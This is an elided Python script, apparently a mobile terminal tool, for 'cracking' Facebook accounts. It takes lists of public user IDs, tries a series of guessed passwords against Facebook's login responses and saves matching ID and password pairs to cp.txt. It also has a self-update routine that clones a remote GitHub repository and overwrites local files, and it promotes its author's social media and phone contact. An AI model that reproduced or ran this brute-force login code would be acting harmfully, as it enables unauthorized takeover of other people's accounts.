...
def main():
	...
	print("\033[96;1m  [J] FOLLOW ME ON FACEBOOK \033[92;1m✘\033[91;1m✘")
	print("\033[96;1m  [K] OWNER WHATSAPP[03189339494]\033[91;1m")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/Subhankhan4.94"])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system("git clone https://github.com/SubhanXKhan/Br-Subhan")
			os.system("rm -rf Dr-Subhan.py")
			os.system("cp -f Subhan/Subhan.py \\.")
			os.system("rm -rf Dr-Subhan")
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		print("\t\033[93;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[92;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
	...
	print("\033[94;1m NAA TO SONAA HOGA [SUBHAN]")
	print("\033[94;1m  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				...
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					if "access_token" in data.text and "EAAA" in data.text:
						...
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;91m[[SUBHAN-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;91m[SUBHAN-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
	...
	print("\033[92;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("\033[91;1mNAAM TO SONAA HOGAA [SUBHAN]")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
...
def crack_select():
	...
	print("\033[93;1m NAAM TO SONA HOGA [SUBHAN]")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
